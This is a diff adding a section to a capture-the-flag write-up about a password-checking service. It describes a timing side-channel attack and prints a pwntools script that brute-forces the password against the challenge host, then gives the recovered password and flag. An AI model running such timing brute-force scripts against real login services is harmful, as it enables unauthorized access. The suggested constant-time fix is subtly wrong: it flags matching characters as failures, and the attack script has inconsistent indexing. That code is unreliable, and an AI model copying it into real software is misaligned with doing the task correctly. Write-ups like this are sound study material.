@@ -455,11 +455,70 @@ The second example takes "more time" to execute!
 
 As you can see the code is completely "broken"
 
+The attack idea is that I'll guess the password one character at a time and it would be based on the fact that if the new guess matches more character of the password it will take a longer time
 
+When I solved this it was so early in the morning I haven't slept at that moment so the script I wrote is pretty not optimized but here's it
 
+```python
+from pwn import *
+import string
+from warnings import filterwarnings
 
+filterwarnings("ignore")
+context.log_level = 'info'
+charset = list(string.printable)
 
+known_char = 'W'
+password = known_char + 'a' * 32
+delay = 0
 
+while True:
+    print(f"Trying password: {password}")
+    sleep(1)
+    io = remote('0.cloud.chals.io', '27650')
+    # io = remote('localhost', '1339')
+    info(f"Password: {password}")
+
+    io.recvuntil('password?')
+    before = time.time()
+
+    io.sendline(password)
+    io.recvuntil('[ ACCESS DENIED ]')
+
+    after = time.time()
+    current_delay = after - before
+    print(f"Current delay: {current_delay}")
+
+    if current_delay <= delay:
+        password = known_char + charset[charset.index(password[2]) + 1] + 'a' * 15
+    else:
+        delay = current_delay
+
+    io.close()
+```
+
+So basically it's more of brute forcing the password via timing based attack then manually changing the index position to brute force once we notice a larger time delay value
+
+After about an hour of patiently doing it automatedly and manually I got the password to be `WizardsAndKnights83` and was able to get the flag to be:
+
+```
+Flag: flag{WizardsAndKnights83}
+```
+
+I think a mitigation would be to not exit early, remove branches if possible & more generally aim for constant-time code 
+
+Something like this I think:
+
+```python
+failed = len(s1) != len(s2)
+
+for i in range(len(s2)):
+    failed |= s1[i] == s2[i]
+
+return not failed
+```
+
+But we just need the flag and we've gotten it so let's continue 🙂
 
 
 
